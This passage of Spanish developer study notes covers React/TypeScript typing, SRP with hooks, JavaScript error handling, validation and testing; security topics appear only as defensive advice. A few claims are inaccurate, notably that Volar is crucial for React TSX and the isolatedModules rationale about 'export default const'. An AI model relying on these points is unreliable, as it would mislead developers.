+Esto evita tener que escribir rutas relativas largas como ../../../components/ui/Button y mantiene la coherencia.
+
+
+#### Tipado de Componentes (Props):
+
+1. Definición de Tipos
+
+Prefiere interface: Para tipar las props de los componentes, generalmente se prefiere usar interface sobre type
+Las interfaces son más fáciles de extender (extendable) y fusionar (declaration merging), lo que es útil para librerías o estructuras de herencia complejas.
+
+##### Tipado Explícito de Eventos: Cuando manejes eventos del DOM, tipa el objeto event correctamente para acceder a sus propiedades
+(ej., e.target.value).
+
+Ejemplo de onChange de input:
+
+```
+React.ChangeEvent<HTMLInputElement>
+```
+
+
+2. Tipado de Componentes Funcionales
+
+Uso de React.FC: Puedes tipar tus componentes como const Componente: React.FC<Props> = ({ prop }) => ....
+muchos desarrolladores prefieren tipar solo las props (const Componente = ({ prop }: Props) => ...) porque React.FC agrega implícitamente la propiedad children
+lo que puede ocultar errores si no esperabas recibirlos.
+
+```
+// Recomendado: Tipar directamente las props
+interface ButtonProps {
+  label: string;
+  onClick: () => void; 
+}
+
+const Button = ({ label, onClick }: ButtonProps) => {
+  // ...
+};
+```
+
+
+#### Tipado de Hooks y Lógica
+
+1. Tipado de useState
+
+
+
+## Componente Presentacional con TypeScript
+
+Inferencia vs. Explicitud: TypeScript casi siempre puede inferir el tipo de useState a partir del valor inicial
+Sin embargo, sé explícito si el valor inicial es null y esperas un objeto después:
+
+```
+// Correcto: Indica que el estado será un User o null
+interface User { id: number; name: string; }
+const [user, setUser] = useState<User | null>(null);
+```
+
+
+Tipado de useReducer:
+
+Acciones y Estado: useReducer requiere un tipado estricto
+Define el tipo del estado y el tipo de las acciones
+(generalmente como una unión de tipos literales para el campo type).
+sto permite que tu reducer garantice que maneja todos los tipos de acción válidos.
+
+
+Tipado de Custom Hooks: 
+
+Tipado de Retorno: Siempre tipa el valor de retorno de tus Custom Hooks para que el componente que los consume sepa exactamente qué esperar
+
+```
+// useCounter.ts
+type CounterHook = [number, () => void, () => void];
+const useCounter = (initial: number): CounterHook => {
+  // ...
+};
+```
+
+
+#### Tipado de Datos Asíncronos (API)
+
+Uso de unknown en Fetching:
+
+Seguridad: Cuando haces data fetching (ej., con fetch o axios), la respuesta inicial debe tiparse como unknown
+(o any si no tienes otra opción) porque no puedes confiar en datos externos.
+
+Validación Estricta: Inmediatamente después de recibir la respuesta, valídala contra un schema definido usando librerías como Zod o Yup
+Esto garantiza que los datos que consumes realmente coincidan con el tipo que esperas.
+
+
+Tipos Globales de API:
+
+Archivos de Definición: Centraliza todas tus interfaces y tipos de datos de API (ej., IProduct, IUser) en un solo lugar (ej., /src/types/index.ts). 
+Esto facilita la reutilización y el mantenimiento de los modelos de datos.
+
+
+#### Utilidades y Mantenimiento
+
+Evita el any:
+
+Elude any: El uso de any desactiva todas las comprobaciones de TypeScript para esa variable, anulando el propósito de usarlo
+Intenta usar tipos más específicos como unknown o Record<string, unknown> cuando el tipo es incierto, forzándote a hacer verificaciones de tipo antes de usar la variable.
+
+
+Módulos Externos:
+
+##### Archivos d.ts: Si una librería JavaScript de terceros no tiene tipos incluidos, busca el paquete @types/nombre-de-libreria e instálalo como dependencia de desarrollo
+Si no existe, puedes crear tu propio archivo .d.ts para declarar los tipos que faltan.
+
+
+#### Inmutabilidad y Seguridad de Tipos
+
+Tipado de Objetos Inmutables:
+
+Solo Lectura (readonly): Cuando defines un tipo para un arreglo u objeto que sabes que no debe modificarse, usa el modificador readonly
+Esto es vital en el estado de React y las props de componentes puros para garantizar la inmutabilidad y evitar mutaciones accidentales.
+
+```
+interface UserProps {
+  readonly id: number; // No puede ser reasignado
+  readonly tags: readonly string[]; // El array no puede ser modificado
+}
+```
+
+
+Evitar Mutaciones con as const:
+
+Literales Inmutables: Usa as const para decirle a TypeScript que un arreglo o un objeto no debe ser ampliado y que sus valores literales nunca cambiarán
+Esto convierte las propiedades a readonly y los valores a tipos literales precisos, lo que es excelente para definir uniones de tipos de forma segura
+(ej., lista de acciones de Redux).
+
+
+Uso de Unión de Tipos para Props Discretas:
+
+Props Condicionales: Cuando un componente puede recibir diferentes conjuntos de props (por ejemplo, un componente Button que se comporta diferente si recibe una prop href o una prop onClick)
+usa Unión de Tipos Disjuntos (Discriminated Unions) para asegurar que solo se pasen las props relevantes para ese caso.
+Ejemplo: Si es un botón de enlace, no puede tener onClick.
+
+
+#### Utilización Avanzada de Tipos
+
+Tipos de Utilidad (Utility Types):
+
+TypeScript incluye varios tipos de utilidad integrados que te ayudan a manipular tipos existentes de forma inmutable:
+
+Partial<Type>: Hace que todas las propiedades de un Type sean opcionales (con ?).
+Útil para funciones de actualización o props que no se requieren inmediatamente.
+
+Omit<Type, Keys>: Crea un nuevo tipo omitiendo ciertas Keys del Type original
+Útil para pasar props a un componente y excluir las que no necesita el elemento nativo.
+
+Pick<Type, Keys>: Crea un nuevo tipo seleccionando solo ciertas Keys del Type original
+Útil para extraer un subconjunto de propiedades de una API.
+
+
+Tipado de Props que Pasan al DOM:
+
+Propagación de Props Nativas: Para un componente wrapper (envoltorio) que pasa props a un elemento HTML nativo (como un div o button)
+usa los tipos intrínsecos de React:
+
+React.HTMLProps<T> o
+React.ComponentPropsWithoutRef<'element'> (siendo 'element' div, button, input, etc.).
+
+Ejemplo: interface ButtonProps extends
+React.ComponentPropsWithoutRef<'button'> { ... }.
+Esto asegura que puedes pasar props nativas como className o id y que estén correctamente tipadas.
+
+
+Tipos de Retorno Explícitos:
+
+Funciones Puras: Aunque TypeScript a menudo infiere el tipo de retorno, hazlo explícito en funciones críticas o complejas (especialmente Custom Hooks o reducers
+Esto actúa como una garantía de que la función siempre devolverá el tipo esperado.
+
+
+#### Integración con Herramientas (Workflow)
+
+Uso de la Extensión Volar:
+Vite/Vue DevTools: Si bien Vite es compatible con React, la extensión de VS Code Volar (o plugins similares) es crucial para una integración fluida con TSX, ya que mejora el syntax highlighting y la comprobación de tipos dentro de los bloques de código y las plantillas.
+
+
+Evitar el Modo isolatedModules:
+
+Transpilación Segura: Vite usa esbuild o SWC, que transpiladores rápidos que operan en modo de archivo único (similar a isolatedModules).
+Esto significa que nunca debes usar export default const sino export default seguido del nombre de la función o componente
+ya que el modo isolatedModules no puede exportar correctamente las constantes por defecto.
+
+
+### SRP con TypeScript
+
+El SRP dicta que cada módulo, clase o función debe tener una y solo una razón para cambiar
+
+Lo aplicaremos dividiendo responsabilidades entre las tres capas: UI (Presentacional), Lógica (Contenedor/Smart) y Reutilización (Custom Hook).
+
+
+1. Custom Hook (Responsabilidad: Lógica Reutilizable del Estado)
+
+Se encarga de gestionar la lógica de estado (toggle) y es totalmente agnóstico a la UI o a dónde se usará.
+
+Archivo: useFavoriteToggle.ts
+
+```
+import { useState, useCallback } from 'react';
+
+// Define la firma de lo que devuelve el hook
+interface UseFavoriteToggleResult {
+  isFavorite: boolean;
+  handleToggle: () => void;
+}
+
+/**
+ * Gestión la lógica de alternar el estado de favorito (true/false).
+ *
+ * @param initialStatus Estado inicial del favorito.
+ * @returns El estado actual y una función para alternarlo.
+ */
+export const useFavoriteToggle = (initialStatus: boolean): UseFavoriteToggleResult => {
+  const [isFavorite, setIsFavorite] = useState<boolean>(initialStatus);
+
+  // Usa useCallback para garantizar que la función es estable.
+  const handleToggle = useCallback(() => {
+    setIsFavorite(prev => !prev);
+    // Aquí podrías añadir lógica de API para persistencia, si fuera parte del hook.
+    console.log(`Estado de favorito cambiado a: ${!isFavorite}`);
+  }, [isFavorite]);
+
+  return { isFavorite, handleToggle };
+};
+```
+
+
+2. Componente Dumb / Presentacional (Responsabilidad: Renderizado)
+
+Solo se encarga de cómo se ve.
+
+Recibe sus datos y funciones solo a través de props y no tiene conocimiento del estado global, APIs o de dónde provienen sus datos.
+
+Archivo: FavoriteButton.tsx
+
+```
+import React from 'react';
+
+// 1. Tipado explícito de Props
+interface FavoriteButtonProps {
+  isFavorite: boolean;
+  onToggle: () => void; // Recibe la función de lógica por prop
+}
+
+/**
+ * Componente Presentacional (Dumb): Renderiza el botón basado en props.
+ */
+const FavoriteButton: React.FC<FavoriteButtonProps> = ({ isFavorite, onToggle }) => {
+  // El icono depende del estado que recibe
+  const icon = isFavorite ? '❤️' : '🤍';
+  const label = isFavorite ? 'Remover de Favoritos' : 'Añadir a Favoritos';
+
+  return (
+    <button
+      onClick={onToggle} // Llama a la función recibida por prop
+      aria-label={label}
+      style={{
+        background: 'none',
+        border: 'none',
+        cursor: 'pointer',
+        fontSize: '24px'
+      }}
+    >
+      {icon} {label}
+    </button>
+  );
+};
+
+export default FavoriteButton;
+```
+
+
+3. Componente Smart / Contenedor (Responsabilidad: Lógica de la Aplicación)
+
+Responsable de unir la lógica con la UI
+
+Llama al Custom Hook y le pasa la lógica y el estado resultante al componente presentacional.
+
+Archivo: ProductContainer.tsx
+
+```
+import React from 'react';
+import FavoriteButton from './FavoriteButton';
+import { useFavoriteToggle } from '../hooks/useFavoriteToggle';
+
+interface ProductContainerProps {
+  productId: string;
+  initialFavoriteStatus: boolean;
+}
+
+/**
+ * Componente Contenedor (Smart): Encargado de la lógica de la aplicación.
+ *
+ * NOTA: Aquí se añadiría lógica como hacer un POST a la API para persistir el cambio
+ * o conectarse al store global (Redux/Zustand).
+ */
+const ProductContainer: React.FC<ProductContainerProps> = ({ productId, initialFavoriteStatus }) => {
+  
+  // 1. Llama al Custom Hook y obtiene la lógica y el estado.
+  const { isFavorite, handleToggle } = useFavoriteToggle(initialFavoriteStatus);
+
+  // 2. Opcional: Lógica adicional de negocio o persistencia
+  const handlePersistToggle = () => {
+    handleToggle(); // Actualiza el estado local
+    console.log(`Producto ${productId}: Iniciando llamada a API para actualizar...`);
+    // Lógica para enviar el cambio al servidor aquí
+  };
+
+  return (
+    <div style={{ padding: '20px', border: '1px solid #ccc' }}>
+      <h3>Producto ID: {productId}</h3>
+      
+      {/* 3. Renderiza el componente Dumb y le pasa la lógica y el estado. */}
+      <FavoriteButton
+        isFavorite={isFavorite}
+        onToggle={handlePersistToggle} // Le pasa la función manejadora del contenedor
+      />
+    </div>
+  );
+};
+
+export default ProductContainer;
+```
+
+
+
+
+# Manejo de Errores
+
+Fundamental para escribir código robusto y confiable.
+
+## 1. Fundamentos
+
+1. try...catch:
+Sintaxis y funcionamiento
+¿Qué tipo de errores captura? (Errores de tiempo de ejecución).
+Accediendo al objeto de error (err o error) dentro del bloque catch.
+
+2. Bloque finally:
+Propósito: Ejecutar código siempre, independientemente de si se produjo un error o no.
+Casos de uso: Liberar recursos (cerrar archivos, conexiones).
+
+3. Lanzamiento de Errores (throw):
+Generar (lanzar) tus propios errores
+Lanzar diferentes tipos de valores (cadenas, números, y el objeto Error).
+
+
+## 3. Tipos de Errores Nativos y el Objeto Error
+
+Jerarquía y las propiedades del objeto Error
+
+1. Objeto Error:
+Propiedades clave: message, name, y stack (pila de llamadas).
+Creación de instancias: new Error("Mi mensaje de error").
+
+2. Tipos de Errores Nativos Comunes:
+SyntaxError (Errores de análisis léxico, no capturables por try...catch en la función donde ocurren).
+ReferenceError (Variables no definidas).
+TypeError (Uso de un valor donde no se espera, ej. llamar a algo que no es una función).
+RangeError (Valores fuera del rango de valores válidos, ej. recursión infinita).
+URIError (Errores en funciones encodeURI/decodeURI).
+
+3. Creación de Clases de Errores Personalizados:
+Extender la clase base Error usando class MiError extends Error {...}.
+Establecer un name personalizado para una fácil identificación.
+
+
+## 3. Manejo de Errores en Código Asíncrono
+
+Requiere técnicas específicas
+
+1. Errores en Callbacks Tradicionales
+El patrón del "Error-Primero" ((err, data) => {}) en Node.js y código antiguo.
+
+2. Errores con Promesas (Promises):
+El método .catch(): La forma estándar de manejar rechazos (rejections).
+La función de rechazo dentro del constructor de la Promesa (reject(new Error(...))).
+Encadenamiento de promesas: Cómo los errores se propagan hasta el siguiente .catch().
+
+3. Manejo de Errores con async/await:
+Usar try...catch alrededor de las llamadas await. Este es el método preferido.
+Comprender que await lanza una excepción si la Promesa se rechaza.
+
+
+## 4. Prácticas y Estrategias Avanzadas
+
+Manejo de errores de manera efectiva en aplicaciones grandes.
+
+1. Fallos Silenciosos vs. Fallos Ruidosos:
+Cuándo registrar un error y continuar (fallo silencioso controlado).
+Cuándo el error debe detener la ejecución o alertar al usuario (fallo ruidoso).
+
+2. Validación de Entrada (Input Validation):
+Prevenir errores mediante la verificación temprana de datos (ej. con aserciones o bibliotecas de validación).
+
+3. Estrategias de Registro (Logging):
+Uso de console.error() vs. herramientas de registro (ej. Log4js, bibliotecas de terceros, o servicios como Sentry/Bugsnag).
+Registrar la pila de llamadas (stack) para facilitar la depuración.
+
+4. Manejo de Errores Globales (Entornos Browser/Node):
+En el navegador: Evento window.onerror y window.onunhandledrejection
+En Node.js: Eventos uncaughtException y unhandledRejection del objeto process.
+La diferencia entre errores capturados y no capturados.
+
+
+## 5. Depuración y Herramientas
+
+Herramientas para encontrar y resolver la causa raíz de los errores
+
+1. Uso del Depurador (Debugger):
+Uso de la declaración debugger en el código.
+Puntos de interrupción (Breakpoints) y la interfaz del depurador en el navegador (DevTools) o IDE.
+Inspección de variables y seguimiento de la pila de llamadas (Call Stack).
+Inspección de variables y seguimiento de la pila de llamadas (Call Stack).
+
+2. Pruebas Unitarias para Errores:
+Asegurar que las funciones lanzan los errores esperados bajo ciertas condiciones (ej. usando expect().toThrow() en Jest/Mocha).
+
+##### Practica: intenta refactorizar código sin manejo de errores para incluir try...catch y promesas, enfocándote en lo que se debe hacer cuando un error realmente rompe tu aplicación.
+
+
+
+
+
+# Validación
+
+Esencial para asegurar la integridad de los datos y la seguridad de tu aplicación.
+
+Desde del lado del cliente hasta las validaciones cruciales del lado del servidor.
+
+
+## 1. Fundamentos Validación Client-Side
+
+Mejora la experiencia del usuario (UX) al proporcionar feedback instantáneo.
+
+1. Uso de Atributos HTML5:
+required: Asegura que un campo no esté vacío.
+minlength/maxlength: Controla la longitud del texto.
+min/max: Controla el rango de valores numéricos.
+type (ej. email, number, url): Utiliza validación de formato incorporada.
+pattern: Uso básico de expresiones regulares (RegEx) para formatos específicos (ej. códigos postales, matrículas).
+
+2. La API de Validación de Restricciones (Constraint Validation API):
+Métodos clave: checkValidity(), reportValidity().
+Propiedades: validity (objeto que contiene flags como valueMissing, typeMismatch, patternMismatch).
+Personalización de mensajes de error con setCustomValidity().
+
+3. Validación con JavaScript Puro (Escuchadores de Eventos):
+Uso de eventos submit en formularios y input/change/blur en campos individuales para validar dinámicamente.
+Mostrar y ocultar mensajes de error de forma manual junto a los campos.
+
+
+## 2. Expresiones Regulares (RegEx) para Validación
+
+Herramienta fundamental para la validación de formato compleja.
+
+1. Conceptos Fundamentales de RegEx:
+Anclas: ^ (inicio) y $ (fin).
+Clases de caracteres: \d (dígito), \w (palabra), . (cualquier carácter).
+Cuantificadores: + (uno o más), * (cero o más), {n,m} (entre n y m).
+Grupos y Alternancia: () y |.
+
+2. Casos de Uso Comunes:
+Validación de correos electrónicos.
+Validación de contraseñas fuertes (longitud, mayúsculas, números, símbolos).
+Validación de números de teléfono y fechas con formato estricto.
+
+
+## 3. Validación del Lado del Servidor (Server-Side)
+
+Módulo es crítico.
+
+La validación del lado del cliente nunca es suficiente para la seguridad.
+
+1. Principio de Confianza Cero:
+Asumir que cualquier dato proveniente del cliente es malicioso o incorrecto.
+Siempre replicar las validaciones del cliente en el servidor.
+
+2. Validaciones de Negocio vs. Validaciones de Formato:
+Formato: Asegurar que un campo sea una cadena o un número.
+Negocio: Verificar reglas específicas (ej. un usuario es mayor de 18 años, un producto está en stock, el nombre de usuario no está tomado).
+
+3. Bibliotecas Populares para el Servidor (Node.js):
+Joi/Yup/Zod: Definición de esquemas de datos y validación de objetos JSON (útil para APIs REST).
+Uso de middleware (como en Express.js) para detener la solicitud si la validación falla.
+
+4. Manejo de Errores de Validación
+Respuesta estándar: Devolver un código de estado 400 Bad Request e incluir un cuerpo de respuesta JSON que detalle los errores específicos por campo.
+
+
+## 4. Técnicas Avanzadas y Seguridad
+
+Abordar escenarios de validación más complejos y consideraciones de seguridad.
+
+1. Validación Asíncrona:
+Casos de uso: Verificar la disponibilidad de un nombre de usuario o correo electrónico en la base de datos antes de enviar el formulario final
+Implementación usando Promesas o async/await.
+
+2. Saneamiento (Sanitization) de Datos:
+Diferencia clave entre Validación (¿Es válido?) y Saneamiento (¿Es seguro modificarlo?).
+Prevención de XSS (Cross-Site Scripting): Eliminación de etiquetas peligrosas (<script>, <iframe>) del input del usuario (ej. usando la biblioteca DOMPurify).
+Inyección SQL: Uso de consultas parametrizadas (esto suele manejarse a nivel del controlador de la base de datos/ORM, pero es crucial). 
+
+3. Validación de Archivos (Uploads):
+Validación de tipo de archivo (MIME Type).
+Validación de tamaño de archivo.
+Validación de dimensiones de imagen (si es necesario).
+
+
+## Recorrido
+
+1. Dominar los atributos HTML5 y la API de Restricciones (Módulo 1).
+2. Aprender a construir y leer las Expresiones Regulares para formatos comunes (Módulo 2).
+3. Practicar la Validación del Lado del Servidor con una biblioteca de esquemas (Joi/Yup/Zod) en un proyecto Node.js/Express (Módulo 3).
+4. Implementar la Validación Asíncrona y el Saneamiento en un formulario de práctica (Módulo 4).
+
+
+
+
+
+# Testing
+
+Crucial para la calidad del software
+
+Permitirá escribir código con confianza, refactorizar sin miedo y prevenir errores en producción.
+
+
+## 1. Fundamentos
+
+1. Testear:
+Ventajas: Confianza en el código, facilitación de la refactorización, documentación del código (las pruebas muestran cómo se usa la función).
+
+Pirámide de Pruebas: Comprender la jerarquía ideal:
+Unitarias (más abajo, más rápidas, más numerosas).
+Integración (nivel intermedio).
+End-to-End (E2E) o UI (más arriba, más lentas, menos numerosas)
+
+2. Terminología Esencial:
+Test Runner: La herramienta que ejecuta las pruebas (ej. Jest, Mocha).
+Assertions (Aserciones): Declaraciones que verifican el resultado esperado (ej. expect(a).toBe(b)).
+Test Suite y Test Case: Organización de las pruebas (describe y it/test).
+
+3. Framework (ej. jest):
+Instalación y configuración
+Sintaxis básica: describe, test (o it), expect.
+
+
+## 2. Pruebas Unitarias (Unit Testing)
+
+1. Alcance de una Unidad:
+Probar la lógica de la unidad más pequeña y aislada de código (una función, un método de clase).
+Asegurar que la función, dado un input, produce el output correcto o el efecto secundario esperado.
+
+2. Mocks, Spies y Stubs
+Mocks: Objetos falsos que reemplazan dependencias externas (ej. llamadas a APIs, acceso a bases de datos) para aislar la unidad bajo prueba.
+Spies: Observadores que envuelven una función existente para rastrear si fue llamada, cuántas veces y con qué argumentos.
+Uso de jest.fn(), jest.mock(), y jest.spyOn().
+
+3. Setup y Teardown
+Uso de funciones de hook (beforeAll, beforeEach, afterEach, afterAll) para inicializar y limpiar el estado antes y después de las pruebas.
+
+
+## 3. Pruebas de Integración (Integration Testing)
+
+Verificar que diferentes partes de tu sistema funcionan correctamente juntas.
+
+1. Definición y Propósito:
+Probar la interacción entre dos o más unidades (ej. un controlador y un servicio, un componente y una tienda de estado).
+
+2. Integración de Servicios (Back-End):
+Probar endpoints de API utilizando herramientas como supertest para simular solicitudes HTTP (GET, POST, etc.) y verificar las respuestas.
+Trabajar con una base de datos de pruebas separada.
+
+3. Integración de Componentes (Front-End):
+Probar cómo interactúan componentes hermanos o padre-hijo (ej. un formulario que pasa datos a un botón).
+Simular el rendering y eventos del usuario.
+
+
+## 4. Pruebas de Interfaz de Usuario y E2E (Front-End Testing)
+
+Simular el comportamiento del usuario final y validar la experiencia completa de la aplicación.
+
+1. Pruebas de Componentes (ej. con React Testing Library o Vue Test Utils):
+Enfoque en las pruebas de comportamiento del usuario en lugar de los detalles internos del componente.
+Uso de selectores accesibles (getByRole, getByText).
+Disparo de eventos del usuario (fireEvent o userEvent).
+
+2. Pruebas End-to-End (E2E):
+Herramientas: Cypress o Playwright.
+Simular un flujo completo del usuario en un navegador real o headless (ej. "Navegar a la página de inicio, iniciar sesión, agregar un artículo al carrito y finalizar la compra").
+Configuración y fixtures (datos de prueba).
+
+
+## 5. Técnicas Avanzadas y Métricas
+
+Llevan tus prácticas de testing al siguiente nivel.
+
+1. Cobertura de Código (Code Coverage):
+Métricas: Cobertura de líneas, funciones y ramas.
+Cómo generar informes de cobertura (Jest lo hace de forma nativa).
+Establecer umbrales de cobertura obligatorios.
+
+2. Test Driven Development (TDD):
+El ciclo Rojo-Verde-Refactorizar (Escribir la prueba que falla → Escribir el código mínimo para que pase → Refactorizar).
+
+3. Pruebas de Regresión y Pruebas de Humo:
+Regresión: Asegurar que los cambios nuevos no rompieron la funcionalidad existente.
+Humo: Un conjunto pequeño de pruebas de alta prioridad para asegurar que la aplicación más básica funciona.
+
+
+## Recorrido
+
+1. Configura Jest en un proyecto pequeño.
+2. Escribe pruebas unitarias para una función pura, usando expect() y toBe().
+3. Escribe pruebas unitarias para una función que depende de una API, usando Mocks para simular la respuesta de la API.
+4. Añade una prueba de integración simple que verifique la comunicación entre dos módulos de tu código.
+5. Si usas un framework de interfaz (React/Vue/Angular), integra RTL/Cypress/Playwright y escribe tu primera prueba E2E.
+
+
+
+
+# Manejos de errores
+
+
+## 1. try...catch
+
+Permite manejar errores durante la ejecución de tu código sin que toda la aplicación se detenga abruptamente (lo que se conoce como "crashing").
+
+try (Intentar): Contiene el código que sospechas que podría fallar o lanzar una excepción (un error).
+Si el código dentro de este bloque se ejecuta sin problemas, el bloque catch se ignora.
+
+catch (Capturar): Si se produce un error en el bloque try, la ejecución se transfiere inmediatamente al bloque catch
+Este bloque recibe el objeto de error como argumento, permitiéndote inspeccionarlo, registrarlo o mostrar un mensaje amigable al usuario.
+
+Sintaxis:
+
+```
+try {
+  // 1. Código que puede lanzar un error (ej. una llamada a una función,
+  //    acceder a una propiedad indefinida, etc.)
+  let resultado = algunaFuncionPeligrosa();
+} catch (error) {
+  // 2. Este bloque se ejecuta SOLAMENTE si el bloque 'try' falla.
+  //    'error' es el objeto que contiene información sobre el fallo.
+  console.error("Se ha producido un error:", error.message);
+  // Aquí puedes registrar el error, notificar al usuario, o ejecutar
+  // código de recuperación.
+}
+```
+
+
+Ej: llamar a una función que no existe
+
+
+```
+try {
+  // Esto lanzará un ReferenceError porque la función 'saludar' no está definida.
+  saludar("Mundo");
+  console.log("Esta línea nunca se ejecutará si hay un error arriba.");
+} catch (err) {
+  // Captura el ReferenceError
+  console.log("¡Algo salió mal!");
+  console.error("Tipo de error:", err.name);      // ReferenceError
+  console.error("Mensaje de error:", err.message); // saludar is not defined
+} finally {
+  // El bloque 'finally' se explica a continuación.
+}
+// El programa continúa ejecutándose aquí, a pesar del error.
+console.log("La aplicación sigue funcionando.");
+```
+
+
+finally:
+Añadir un tercer bloque opcional, finally, que se ejecuta siempre, independientemente de si hubo o no un error.
+
+Propósito: Se utiliza para realizar operaciones de limpieza o liberar recursos
+(ej. cerrar una conexión de base de datos, detener un loader de carga).
+
+```
+try {
+  // Código...
+} catch (err) {
+  // Manejo del error...
+} finally {
+  // ¡Se ejecuta siempre!
+  // Aquí puedes poner código de limpieza.
+  console.log("Proceso terminado. Recursos liberados.");
+}
+```
+
+
+### Limitaciones Clave de try... catch
+
+1. Solo Errores de Tiempo de Ejecución: try...catch solo puede capturar errores que ocurren mientras el código se está ejecutando 
+(errores de tiempo de ejecución) como ReferenceError o TypeError.
+No puede capturar SyntaxError (errores de sintaxis) porque el motor de JS ni siquiera puede parsear el código correctamente.
+
+2. Captura Errores Asíncronos: El try...catch no funciona directamente con código asíncrono como callbacks o funciones de setTimeout
+Si el error ocurre después de que el bloque try haya terminado, no se capturará.
+
+Solución para Asíncrono:
+Para Promesas, se usa el método .catch().
+Para funciones async/await, puedes usar try...catch alrededor de la llamada await
+await transforma el rechazo de la Promesa en una excepción que try...catch puede capturar.
+
+```
+// Ejemplo con async/await (DONDE SÍ FUNCIONA)
+async function obtenerDatos() {
+  try {
+    const respuesta = await fetch('url-invalida');
+    const datos = await respuesta.json();
+  } catch (err) {
+    // Esto captura el error de la Promesa rechazada por fetch
+    console.error("Error en la petición asíncrona:", err);
+  }
+}
+```
+
+
+## Finally
+
+Tercera parte opcional de la estructura de manejo de errores try...catch.
+Su principal objetivo es asegurar que un código específico siempre se ejecute
+Sin importar si el bloque try terminó con éxito o si lanzó y fue capturado por un error.
+
+finally garantiza la ejecución del código que contiene en tres escenarios posibles:
+
+1. Éxito: El código dentro de try se ejecuta completamente sin errores.
+2. Fallo Capturado: El código dentro de try lanza un error, y este es capturado por el bloque catch.
+3. Fallo No Capturado o Salida Anticipada: El código dentro de try o catch contiene una sentencia de salida como return, break o continue.
+
+El finally está diseñado para realizar tareas de limpieza y liberar recursos.
+
+Uso Comunes:
+Liberación de Recursos	Cerrar recursos que deben ser liberados para evitar pérdidas de memoria o conexiones ocupadas
+Limpieza de Estado	Ocultar spinners o loaders de carga que se iniciaron en el bloque try, sin importar si la operación asíncrona tuvo éxito o falló.
+
+
+Sintaxis:
+
+```
+try {
+  // 1. Intentar hacer algo (ej. abrir un archivo o conexión a la BD).
+  // Si tiene éxito, el control pasa a 'finally'.
+  conectarBaseDatos();
+  // ... hacer operaciones ...
+} catch (error) {
+  // 2. Si falla, el control pasa a 'catch' y luego a 'finally'.
+  console.error("Error al procesar los datos:", error);
+} finally {
+  // 3. Se ejecuta en todos los casos.
+  // Es ideal para la limpieza.
+  desconectarBaseDatos();
+  console.log("Conexión cerrada, independientemente del resultado.");
+}
+```
+
+
+Ej: Salida Anticipada (return)
+
+Demuestra que finally se ejecuta incluso si el bloque try devuelve un valor.
+
+```
+function verificarNumero(num) {
+  try {
+    if (num < 0) {
+      throw new Error("Número negativo");
+    }
+    // El 'return' se procesa, pero 'finally' se ejecuta antes de que
+    // el valor sea devuelto a quien llamó a la función.
+    return "Número válido"; 
+  } catch (err) {
+    return "Error: " + err.message;
+  } finally {
+    console.log("--- FINALIZANDO PROCESO DE VERIFICACIÓN ---");
+    // El código aquí se ejecuta antes de que la función retorne
+    // el valor "Número válido" o "Error: Número negativo".
+  }
+}
+
+console.log(verificarNumero(10)); 
+// Output:
+// --- FINALIZANDO PROCESO DE VERIFICACIÓN ---
+// Número válido
+```
+
+
+Prioridad de finally:
+
+##### Si el bloque try o catch intenta devolver un valor, y el bloque finally también tiene una sentencia return
+##### El valor de retorno de finally sobrescribe cualquier otro valor de retorno anterior
+##### Por esta razón, generalmente no se recomienda incluir sentencias return dentro de finally
+
+
+
+## Throw 
+
+Mecanismo para crear y lanzar explícitamente una excepción o un error
+##### Permite señalar, desde tu código, que algo inesperado o inválido ha ocurrido. 
+
+##### Su propósito es detener inmediatamente la ejecución del código actual 
+##### Y transferir el control a la estructura de manejo de errores más cercana (típicamente un bloque catch).
+
+Flujo de throw:
+1. El código llega a la línea throw.
+2. La ejecución de la función actual se detiene de golpe.
+3. El motor de JavaScript busca el bloque try...catch que pueda "atrapar" ese error.
+
+##### Si no se encuentra un bloque catch que atrape la excepción, el programa terminará y mostrará el error en la consola (Uncaught Error).
+
+
+Sintaxis y Tipos de Valores:
+Puedes lanzar prácticamente cualquier tipo de valor con throw
+##### Aunque la mejor práctica es siempre lanzar instancias del objeto Error.
+
+
+Lanzar el Objeto Error (Mejor Práctica):
+##### El objeto Error proporciona información valiosa como la pila de llamadas (stack), el nombre (name) y el mensaje (message).
+
+```
+// La mejor manera de lanzar un error
+if (cantidad <= 0) {
+  throw new Error("La cantidad debe ser un número positivo.");
+}
+```
+
+
+Lanzar Errores Nativos Específicos:
+Puedes lanzar los tipos de errores incorporados de JavaScript, lo que ayuda a categorizar el problema:
+
+```
+// ReferenceError: Si una variable o función no existe.
+if (typeof usuario !== 'object') {
+  throw new TypeError("El parámetro 'usuario' debe ser un objeto.");
+}
+```
+
+
+Lanzar Otros Tipos de Valores (Evitar):
+Puedes lanzar cadenas de texto, números o booleanos, pero esto hace que la depuración sea difícil porque carecen de la información de la pila de llamadas.
+
+```
+// Aunque es posible, NO es recomendable:
+throw "Error: Datos inválidos.";
+```
+
+
+### Integración de Throw con try...catch
+
+throw y catch trabajan juntos para manejar el flujo del programa cuando se detecta un problema.
+
+```
+function procesarPedido(items) {
+  if (items.length === 0) {
+    // 1. Aquí usamos 'throw' para lanzar un error personalizado.
+    throw new Error("El carrito de compras no puede estar vacío.");
+  }
+  // ... lógica de procesamiento ...
+  return true;
+}
+
+try {
+  procesarPedido([]); // 2. La llamada a la función lanza un error
+} catch (error) {
+  // 3. El bloque 'catch' lo captura.
+  console.error("⛔ Error capturado:", error.message);
+}
+// 4. El programa continúa ejecutándose aquí, sin 'crashear'.
+console.log("Fin del programa.");
+```
+
+
+Uso Comunes:
+
+1. Validación de Argumentos: Asegurar que una función reciba los parámetros esperados.
+Ejemplo: throw new Error('Parámetro faltante') si un argumento es undefined.
+
+2. Condiciones Ilegales: Indicar que la aplicación ha llegado a un estado que nunca debería ocurrir.
+Ejemplo: Cuando una respuesta de API no tiene un código de estado esperado.
+
+3. Errores Personalizados: Utilizar clases para crear tus propios errores con lógica de negocio específica.
+
+```
+// Error Personalizado
+class CarritoVacioError extends Error {
+  constructor(msg) {
+    super(msg);
+    this.name = "CarritoVacioError";
+  }
+}
+
+function verificarCarrito() {
+  // ...
+  throw new CarritoVacioError("No hay productos.");
+}
+```
+
+
+##### Usar throw cuando detectas una situación donde no es posible continuar con la lógica de tu función o módulo.
+
+throw se usa para lanzar (crear/generar) una excepción y detener el flujo normal de ejecución de un código.
+try...catch se usa para capturar y manejar esa excepción, permitiendo que el programa se recupere y continúe.
+
+1. Validación de Argumentos
+Una función requiere un número, pero recibe una cadena (string).
+El contrato de la función se rompe. El resultado sería impredecible o incorrecto sin el argumento adecuado.
+
+2. Fallos de Lógica de Negocio
+Intentar retirar dinero de una cuenta con saldo insuficiente.
+Es un error en el contexto de la aplicación. Detener la transacción previene un estado inválido.
+
+3. Operación Imposible
